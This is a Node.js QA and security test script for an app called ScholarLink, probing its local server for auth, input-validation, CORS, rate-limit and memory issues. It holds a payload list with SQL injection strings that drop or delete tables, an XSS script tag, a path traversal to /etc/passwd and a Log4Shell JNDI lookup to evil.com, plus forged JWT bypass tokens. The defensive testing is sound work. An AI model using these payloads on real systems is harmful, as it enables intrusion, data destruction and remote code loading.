#!/usr/bin/env node

/**
 * Comprehensive QA Test Suite for ScholarLink
 * This script performs systematic testing to identify bugs, errors, and vulnerabilities
 * 
 * IMPORTANT: This script only identifies and reports issues - it does NOT fix them
 */

import http from 'http';
import https from 'https';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Test configuration
const BASE_URL = 'http://localhost:5000';
const AGENT_BRIDGE_ENABLED = process.env.SHARED_SECRET ? true : false;
const TEST_RESULTS = [];

// Test result structure
let TEST_ID_COUNTER = 1;

function createTestResult(location, description, stepsToReproduce, observedOutput, expectedOutput, severity = 'Medium') {
  return {
    issueId: `QA-${String(TEST_ID_COUNTER++).padStart(3, '0')}`,
    location,
    description,
    stepsToReproduce,
    observedOutput,
    expectedOutput,
    severity
  };
}

function logTestResult(result) {
  TEST_RESULTS.push(result);
  console.log(`\n[${result.issueId}] ${result.severity}: ${result.description}`);
  console.log(`Location: ${result.location}`);
  console.log(`Observed: ${result.observedOutput}`);
  console.log(`Expected: ${result.expectedOutput}`);
}

// HTTP request helper
function makeRequest(method, path, headers = {}, body = null) {
  return new Promise((resolve, reject) => {
    const url = new URL(path, BASE_URL);
    const options = {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname + url.search,
      method,
      headers: {
        'Content-Type': 'application/json',
        ...headers
      }
    };

    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => {
        try {
          const jsonData = data ? JSON.parse(data) : null;
          resolve({ status: res.statusCode, headers: res.headers, data: jsonData, rawData: data });
        } catch (e) {
          resolve({ status: res.statusCode, headers: res.headers, data: null, rawData: data });
        }
      });
    });

    req.on('error', reject);

    if (body) {
      req.write(typeof body === 'string' ? body : JSON.stringify(body));
    }

    req.end();
  });
}

// File system analysis
async function analyzeCodebaseStructure() {
  console.log('\n=== CODEBASE STRUCTURE ANALYSIS ===');
  
  // Test 1: Check for missing critical files
  const criticalFiles = [
    'package.json',
    'server/index.ts',
    'server/routes.ts',
    'server/storage.ts',
    'shared/schema.ts',
    'client/src/App.tsx',
    'client/src/hooks/useAuth.ts'
  ];
  
  for (const file of criticalFiles) {
    try {
      const exists = fs.existsSync(file);
      if (!exists) {
        logTestResult(createTestResult(
          file,
          'Critical file missing from codebase',
          `Check if file ${file} exists in the project root`,
          'File not found',
          'File should exist and be readable',
          'Critical'
        ));
      }
    } catch (error) {
      logTestResult(createTestResult(
        file,
        'Error accessing critical file',
        `Attempt to read file ${file}`,
        error.message,
        'File should be accessible',
        'High'
      ));
    }
  }

  // Test 2: Check package.json for potential dependency issues
  try {
    const packageJson = JSON.parse(fs.readFileSync('package.json', 'utf8'));
    
    // Check for missing scripts
    const requiredScripts = ['dev', 'build', 'db:push'];
    for (const script of requiredScripts) {
      if (!packageJson.scripts || !packageJson.scripts[script]) {
        logTestResult(createTestResult(
          'package.json:scripts',
          `Missing required npm script: ${script}`,
          `Check package.json scripts section for ${script}`,
          'Script not found',
          `Script ${script} should be defined`,
          'Medium'
        ));
      }
    }
    
    // Check for potential security vulnerabilities in dependencies
    const potentiallyVulnerableDeps = ['express', 'jsonwebtoken', 'passport'];
    for (const dep of potentiallyVulnerableDeps) {
      if (packageJson.dependencies && packageJson.dependencies[dep]) {
        // This is just flagging for manual review - version checking would require external API
        console.log(`INFO: Security-critical dependency found: ${dep}@${packageJson.dependencies[dep]} - recommend version audit`);
      }
    }
    
  } catch (error) {
    logTestResult(createTestResult(
      'package.json',
      'Cannot parse package.json',
      'Attempt to parse package.json as JSON',
      error.message,
      'Valid JSON structure',
      'Critical'
    ));
  }
}

// API endpoint testing
async function testAPIEndpoints() {
  console.log('\n=== API ENDPOINT TESTING ===');
  
  // Test 3: Health endpoint
  try {
    const response = await makeRequest('GET', '/health');
    if (response.status !== 200) {
      logTestResult(createTestResult(
        'server/routes.ts - /health endpoint',
        'Health endpoint returns non-200 status',
        'Send GET request to /health',
        `HTTP ${response.status}: ${JSON.stringify(response.data)}`,
        'HTTP 200 with health status',
        'Medium'
      ));
    }
    
    // Check if health response includes agent information
    if (response.data && !response.data.agent_id) {
      logTestResult(createTestResult(
        'server/routes.ts - /health endpoint',
        'Health endpoint missing agent identification',
        'Send GET request to /health and check response structure',
        `Response: ${JSON.stringify(response.data)}`,
        'Response should include agent_id field',
        'Low'
      ));
    }
  } catch (error) {
    logTestResult(createTestResult(
      'server/routes.ts - /health endpoint',
      'Health endpoint completely inaccessible',
      'Send GET request to /health',
      error.message,
      'Successful HTTP response',
      'Critical'
    ));
  }

  // Test 4: Authentication endpoints
  try {
    const authResponse = await makeRequest('GET', '/api/auth/user');
    if (authResponse.status !== 401) {
      logTestResult(createTestResult(
        'server/routes.ts:26 - /api/auth/user',
        'Auth endpoint should reject unauthenticated requests with 401',
        'Send GET request to /api/auth/user without authentication',
        `HTTP ${authResponse.status}: ${JSON.stringify(authResponse.data)}`,
        'HTTP 401 Unauthorized',
        'High'
      ));
    }
  } catch (error) {
    logTestResult(createTestResult(
      'server/routes.ts:26 - /api/auth/user',
      'Auth endpoint error handling issue',
      'Send GET request to /api/auth/user',
      error.message,
      'HTTP 401 response',
      'High'
    ));
  }

  // Test 5: Agent Bridge endpoints
  try {
    const capabilitiesResponse = await makeRequest('GET', '/agent/capabilities');
    if (capabilitiesResponse.status !== 200) {
      logTestResult(createTestResult(
        'server/routes.ts:595 - /agent/capabilities',
        'Agent capabilities endpoint not responding correctly',
        'Send GET request to /agent/capabilities',
        `HTTP ${capabilitiesResponse.status}`,
        'HTTP 200 with capabilities list',
        'Medium'
      ));
    } else {
      // Check capabilities structure
      const data = capabilitiesResponse.data;
      if (!data || !Array.isArray(data.capabilities)) {
        logTestResult(createTestResult(
          'server/routes.ts:595 - /agent/capabilities',
          'Agent capabilities response has invalid structure',
          'Send GET request to /agent/capabilities and check response format',
          JSON.stringify(data),
          'Response with capabilities array field',
          'Medium'
        ));
      }
    }
  } catch (error) {
    logTestResult(createTestResult(
      'server/routes.ts:595 - /agent/capabilities',
      'Agent capabilities endpoint throws error',
      'Send GET request to /agent/capabilities',
      error.message,
      'Valid JSON response',
      'High'
    ));
  }

  // Test 6: Agent task endpoint security
  try {
    const taskResponse = await makeRequest('POST', '/agent/task', {}, { task_id: 'test', action: 'test' });
    if (taskResponse.status !== 401) {
      logTestResult(createTestResult(
        'server/routes.ts:560 - /agent/task',
        'Agent task endpoint security vulnerability - should reject unauthorized requests',
        'Send POST request to /agent/task without valid JWT token',
        `HTTP ${taskResponse.status}: ${JSON.stringify(taskResponse.data)}`,
        'HTTP 401 Unauthorized',
        'Critical'
      ));
    }
  } catch (error) {
    logTestResult(createTestResult(
      'server/routes.ts:560 - /agent/task',
      'Agent task endpoint error in security validation',
      'Send POST request to /agent/task without auth',
      error.message,
      'HTTP 401 response',
      'High'
    ));
  }
}

// Input validation testing
async function testInputValidation() {
  console.log('\n=== INPUT VALIDATION TESTING ===');
  
  // Test 7: SQL Injection attempts (safe testing)
  const sqlInjectionPayloads = [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "'; DELETE FROM student_profiles; --",
    "UNION SELECT * FROM users",
    "<script>alert('xss')</script>",
    "../../etc/passwd",
    "${jndi:ldap://evil.com/x}"
  ];

  for (const payload of sqlInjectionPayloads) {
    try {
      const response = await makeRequest('GET', `/api/scholarships/${encodeURIComponent(payload)}`);
      // Any response other than 401 (auth required) or 404 (not found) could indicate vulnerability
      if (response.status === 200 && response.data) {
        logTestResult(createTestResult(
          'server/routes.ts:79 - scholarship ID parameter',
          'Potential SQL injection vulnerability detected',
          `Send GET request to /api/scholarships/${payload}`,
          `HTTP ${response.status}: ${JSON.stringify(response.data)}`,
          'HTTP 404 or proper error handling',
          'Critical'
        ));
      }
    } catch (error) {
      // Network errors are expected and safe - this means the server properly rejected the request
    }
  }

  // Test 8: Large payload handling
  try {
    const largePayload = 'A'.repeat(10000000); // 10MB string
    const response = await makeRequest('POST', '/api/profile', {
      'Authorization': 'Bearer fake-token'
    }, { 
      major: largePayload,
      gpa: "3.5"
    });
    
    if (response.status === 500) {
      logTestResult(createTestResult(
        'server/routes.ts:49 - /api/profile POST',
        'Server crashes or errors on large payload',
        'Send POST request with 10MB string in major field',
        `HTTP ${response.status}: ${response.rawData}`,
        'HTTP 413 Request Entity Too Large or proper validation error',
        'Medium'
      ));
    }
  } catch (error) {
    if (error.code === 'ECONNRESET') {
      logTestResult(createTestResult(
        'Express server configuration',
        'Server connection reset on large payload - missing request size limits',
        'Send large POST request (10MB) to /api/profile',
        'Connection reset by peer',
        'Proper request size limit with 413 status',
        'Medium'
      ));
    }
  }

  // Test 9: Invalid JSON payload
  try {
    const response = await makeRequest('POST', '/api/profile', {
      'Authorization': 'Bearer fake-token',
      'Content-Type': 'application/json'
    }, '{invalid json}');
    
    if (response.status !== 400) {
      logTestResult(createTestResult(
        'Express middleware - JSON parsing',
        'Invalid JSON handling does not return 400 Bad Request',
        'Send POST request with malformed JSON to /api/profile',
        `HTTP ${response.status}: ${response.rawData}`,
        'HTTP 400 Bad Request',
        'Low'
      ));
    }
  } catch (error) {
    // Expected for malformed JSON
  }
}

// Database-related testing
async function testDatabaseQueries() {
  console.log('\n=== DATABASE QUERY TESTING ===');
  
  // Test 10: Check for potential race conditions in user creation
  // This tests the upsert operation in storage.ts
  
  // Test 11: Check for missing null checks
  try {
    const response = await makeRequest('GET', '/api/matches');
    if (response.status === 500 && response.data && response.data.message) {
      if (response.data.message.includes('null') || response.data.message.includes('undefined')) {
        logTestResult(createTestResult(
          'server/routes.ts:93-102 - /api/matches',
          'Null pointer exception in matches endpoint',
          'Send GET request to /api/matches without authentication',
          JSON.stringify(response.data),
          'Proper null checking and error handling',
          'High'
        ));
      }
    }
  } catch (error) {
    // Expected due to authentication requirement
  }

  // Test 12: Dashboard stats null handling
  try {
    const response = await makeRequest('GET', '/api/dashboard/stats');
    if (response.status === 500) {
      logTestResult(createTestResult(
        'server/routes.ts:487 - dashboard stats',
        'Dashboard stats endpoint crashes on edge cases',
        'Send GET request to /api/dashboard/stats',
        `HTTP ${response.status}: ${JSON.stringify(response.data)}`,
        'Graceful handling of missing data',
        'Medium'
      ));
    }
  } catch (error) {
    // Expected due to authentication requirement
  }
}

// Frontend-specific testing (static analysis)
async function testFrontendCode() {
  console.log('\n=== FRONTEND CODE ANALYSIS ===');
  
  // Test 13: Check for console errors in dashboard component
  try {
    const dashboardCode = fs.readFileSync('client/src/pages/dashboard.tsx', 'utf8');
    
    // Check for potential DOM nesting issues (from logs)
    if (dashboardCode.includes('<div>') && dashboardCode.includes('<p>')) {
      const divInPPattern = /\<p[^>]*\>[\s\S]*?\<div/g;
      const matches = dashboardCode.match(divInPPattern);
      if (matches) {
        logTestResult(createTestResult(
          'client/src/pages/dashboard.tsx',
          'Invalid DOM nesting: div elements inside p elements',
          'Inspect dashboard.tsx for div inside p tags, particularly in Skeleton components',
          'DOM nesting warning in browser console',
          'Valid HTML structure with proper element nesting',
          'Low'
        ));
      }
    }
    
    // Test 14: Check for missing error boundaries
    if (!dashboardCode.includes('ErrorBoundary') && dashboardCode.includes('throw')) {
      logTestResult(createTestResult(
        'client/src/pages/dashboard.tsx',
        'Missing error boundary for error handling',
        'Check if error boundary is implemented around components that may throw errors',
        'No error boundary implementation found',
        'React error boundary to catch and handle component errors',
        'Medium'
      ));
    }
    
  } catch (error) {
    logTestResult(createTestResult(
      'client/src/pages/dashboard.tsx',
      'Cannot read dashboard component file',
      'Attempt to read dashboard.tsx file',
      error.message,
      'Readable TypeScript file',
      'High'
    ));
  }

  // Test 15: Auth hook potential infinite loop
  try {
    const authHookCode = fs.readFileSync('client/src/hooks/useAuth.ts', 'utf8');
    
    // Check for missing dependency arrays in useEffect
    if (authHookCode.includes('useEffect') && !authHookCode.includes('[')) {
      logTestResult(createTestResult(
        'client/src/hooks/useAuth.ts:5-8',
        'useQuery might cause unnecessary re-renders',
        'Check useAuth hook implementation for optimization issues',
        'useQuery without proper dependency management',
        'Optimized query with proper dependency array',
        'Low'
      ));
    }
    
  } catch (error) {
    logTestResult(createTestResult(
      'client/src/hooks/useAuth.ts',
      'Cannot analyze auth hook file',
      'Attempt to read useAuth.ts file',
      error.message,
      'Readable TypeScript file',
      'Medium'
    ));
  }
}

// Environment and configuration testing
async function testEnvironmentConfiguration() {
  console.log('\n=== ENVIRONMENT CONFIGURATION TESTING ===');
  
  // Test 16: Check for exposed secrets in logs
  const sensitivePatterns = [
    /password/gi,
    /secret/gi,
    /key.*=.*[a-zA-Z0-9]{20,}/gi,
    /token.*=.*[a-zA-Z0-9]{20,}/gi
  ];
  
  try {
    // This would be checking server logs in a real scenario
    console.log('INFO: Manual check required - review server logs for exposed secrets');
    
    // Test environment variable handling
    if (!AGENT_BRIDGE_ENABLED) {
      logTestResult(createTestResult(
        'server/agentBridge.ts:8',
        'Agent Bridge disabled due to missing SHARED_SECRET',
        'Start application without SHARED_SECRET environment variable',
        'Agent Bridge disabled message in logs',
        'Graceful degradation (this is actually correct behavior)',
        'Low'
      ));
    }
    
  } catch (error) {
    // Log analysis would happen here
  }

  // Test 17: CORS configuration
  try {
    const response = await makeRequest('OPTIONS', '/api/auth/user', {
      'Origin': 'http://malicious-site.com',
      'Access-Control-Request-Method': 'GET'
    });
    
    if (response.headers['access-control-allow-origin'] === '*') {
      logTestResult(createTestResult(
        'server/index.ts - CORS configuration',
        'Overly permissive CORS configuration allows any origin',
        'Send OPTIONS request with malicious origin to any API endpoint',
        `CORS header: ${response.headers['access-control-allow-origin']}`,
        'Restricted CORS to specific domains only',
        'High'
      ));
    }
  } catch (error) {
    // Expected for CORS preflight
  }
}

// Agent Bridge specific testing
async function testAgentBridge() {
  console.log('\n=== AGENT BRIDGE TESTING ===');
  
  if (!AGENT_BRIDGE_ENABLED) {
    console.log('Agent Bridge disabled - skipping specific tests');
    return;
  }

  // Test 18: JWT verification bypass attempts
  const bypassAttempts = [
    'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c', // Known test JWT
    'Bearer null',
    'Bearer undefined',
    'Bearer ',
    'jwt malformed-token',
    'Bearer {"admin": true}'
  ];

  for (const token of bypassAttempts) {
    try {
      const response = await makeRequest('POST', '/agent/task', {
        'Authorization': token
      }, {
        task_id: 'bypass-test',
        action: 'test',
        trace_id: 'test'
      });
      
      if (response.status !== 401) {
        logTestResult(createTestResult(
          'server/agentBridge.ts - JWT verification',
          'JWT verification bypass detected',
          `Send request with invalid JWT: ${token.substring(0, 30)}...`,
          `HTTP ${response.status}: ${JSON.stringify(response.data)}`,
          'HTTP 401 Unauthorized',
          'Critical'
        ));
      }
    } catch (error) {
      // Expected for invalid tokens
    }
  }

  // Test 19: Rate limiting effectiveness
  try {
    const promises = [];
    for (let i = 0; i < 8; i++) {
      promises.push(makeRequest('POST', '/agent/task', {
        'Authorization': 'Bearer fake-token'
      }, { task_id: `rate-test-${i}` }));
    }
    
    const responses = await Promise.allSettled(promises);
    const rateLimited = responses.filter(r => 
      r.status === 'fulfilled' && r.value.status === 429
    ).length;
    
    if (rateLimited === 0) {
      logTestResult(createTestResult(
        'server/routes.ts:17-23 - Rate limiting',
        'Rate limiting not working - allows unlimited requests',
        'Send 8 rapid requests to /agent/task endpoint',
        'All requests processed without rate limiting',
        'Requests limited to 5 per minute with 429 status',
        'Medium'
      ));
    }
  } catch (error) {
    // Rate limiting test error
  }
}

// Performance and memory testing
async function testPerformanceIssues() {
  console.log('\n=== PERFORMANCE TESTING ===');
  
  // Test 20: Memory usage patterns
  const initialMemory = process.memoryUsage();
  
  // Simulate heavy API usage
  try {
    const promises = [];
    for (let i = 0; i < 50; i++) {
      promises.push(makeRequest('GET', '/health'));
    }
    await Promise.all(promises);
    
    const finalMemory = process.memoryUsage();
    const memoryIncrease = finalMemory.heapUsed - initialMemory.heapUsed;
    
    if (memoryIncrease > 50 * 1024 * 1024) { // 50MB increase
      logTestResult(createTestResult(
        'Server memory management',
        'Potential memory leak detected during API requests',
        'Send 50 concurrent requests to /health endpoint',
        `Memory increased by ${Math.round(memoryIncrease / 1024 / 1024)}MB`,
        'Minimal memory increase after requests',
        'Medium'
      ));
    }
  } catch (error) {
    logTestResult(createTestResult(
      'Performance testing',
      'Error during concurrent request testing',
      'Send 50 concurrent requests',
      error.message,
      'All requests handled successfully',
      'Low'
    ));
  }
}

// Generate comprehensive report
function generateReport() {
  console.log('\n\n========================================');
  console.log('COMPREHENSIVE QA ANALYSIS REPORT');
  console.log('========================================');
  
  const criticalIssues = TEST_RESULTS.filter(r => r.severity === 'Critical');
  const highIssues = TEST_RESULTS.filter(r => r.severity === 'High');
  const mediumIssues = TEST_RESULTS.filter(r => r.severity === 'Medium');
  const lowIssues = TEST_RESULTS.filter(r => r.severity === 'Low');
  
  console.log(`\nSUMMARY:`);
  console.log(`Critical Issues: ${criticalIssues.length}`);
  console.log(`High Issues: ${highIssues.length}`);
  console.log(`Medium Issues: ${mediumIssues.length}`);
  console.log(`Low Issues: ${lowIssues.length}`);
  console.log(`Total Issues: ${TEST_RESULTS.length}`);
  
  console.log('\n========================================');
  console.log('DETAILED FINDINGS');
  console.log('========================================');
  
  TEST_RESULTS.forEach(result => {
    console.log(`\n${result.issueId}: ${result.description}`);
    console.log(`Location: ${result.location}`);
    console.log(`Severity: ${result.severity}`);
    console.log(`Steps to Reproduce: ${result.stepsToReproduce}`);
    console.log(`Observed Output: ${result.observedOutput}`);
    console.log(`Expected Output: ${result.expectedOutput}`);
    console.log('---');
  });
  
  // Save results to file
  const reportContent = {
    timestamp: new Date().toISOString(),
    summary: {
      critical: criticalIssues.length,
      high: highIssues.length,
      medium: mediumIssues.length,
      low: lowIssues.length,
      total: TEST_RESULTS.length
    },
    issues: TEST_RESULTS
  };
  
  fs.writeFileSync('qa-analysis-report.json', JSON.stringify(reportContent, null, 2));
  console.log('\nDetailed JSON report saved to: qa-analysis-report.json');
}

// Main test execution
async function runComprehensiveQA() {
  console.log('Starting Comprehensive QA Analysis...');
  console.log('=====================================');
  
  try {
    await analyzeCodebaseStructure();
    await testAPIEndpoints();
    await testInputValidation();
    await testDatabaseQueries();
    await testFrontendCode();
    await testEnvironmentConfiguration();
    await testAgentBridge();
    await testPerformanceIssues();
    
    generateReport();
    
    console.log('\n✅ QA Analysis Complete');
    console.log(`📊 Found ${TEST_RESULTS.length} potential issues`);
    console.log('📝 Review the detailed report above and in qa-analysis-report.json');
    
  } catch (error) {
    console.error('\n❌ QA Analysis Error:', error);
    process.exit(1);
  }
}

// Execute if run directly
if (import.meta.url === `file://${process.argv[1]}`) {
  runComprehensiveQA();
}

export { runComprehensiveQA, createTestResult, logTestResult };